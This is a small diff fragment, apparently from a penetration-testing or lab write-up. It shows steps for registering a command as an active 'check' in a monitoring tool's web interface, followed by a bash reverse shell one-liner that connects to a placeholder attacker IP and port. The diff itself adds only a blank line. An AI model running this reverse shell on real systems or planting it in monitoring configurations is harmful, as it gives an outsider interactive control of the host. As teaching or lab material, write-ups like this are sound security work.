@@ -125,6 +125,7 @@ Create a reverse shell command with the following parameters:
 * Command type: check
 * Check "Active" box
 * Enter the reverse shell command in the "Command view" field and click save.
+
 ```bash
 bash -c 'bash -i >& /dev/tcp/<YOUR IP>/<YOUR PORT> 0>&1'
 ```
